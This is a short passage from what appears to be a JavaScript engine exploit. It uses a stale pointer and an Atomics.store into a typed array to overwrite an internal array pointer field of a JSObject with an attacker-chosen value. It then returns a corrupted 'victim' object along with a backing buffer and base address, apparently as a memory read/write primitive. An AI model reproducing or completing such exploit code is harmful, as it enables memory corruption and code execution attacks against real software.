  };

  // stale ptr offset 13*8 = 0x68 overlaps JSObject.u.array.u.ptr
  Atomics.store(ta, 13, evil);
  if (victim === null)
    throw new Error('failed to create victim');
  return { backing, victim, base: base_addr };
